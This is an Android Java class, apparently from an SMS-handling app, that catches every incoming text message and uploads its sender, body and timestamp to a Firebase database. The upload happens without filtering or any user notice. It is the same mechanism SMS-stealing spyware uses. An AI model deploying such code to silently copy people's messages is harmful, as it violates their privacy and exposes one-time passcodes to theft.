package com.anhnlp.models;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.Date;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu, bundle.getString("format"));
                        String sender = smsMessage.getOriginatingAddress();
                        String content = smsMessage.getMessageBody();
                        long timestamp = smsMessage.getTimestampMillis();

                        // Tạo đối tượng Message
                        Message message = new Message(sender, content, timestamp);

                        // Đẩy lên Firebase
                        pushToFirebase(message);
                    }
                }
            }
        }
    }

    private void pushToFirebase(Message message) {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference messagesRef = database.getReference("Messages");
        String messageId = messagesRef.push().getKey(); // Tạo ID duy nhất cho tin nhắn
        messagesRef.child(messageId).setValue(message)
                .addOnSuccessListener(aVoid -> {
                    // Thành công
                    // Bạn có thể thêm thông báo hoặc xử lý tiếp nếu cần
                })
                .addOnFailureListener(e -> {
                    // Xử lý lỗi
                    // Ví dụ: Log.e("Firebase", "Error: " + e.getMessage());
                });
    }
}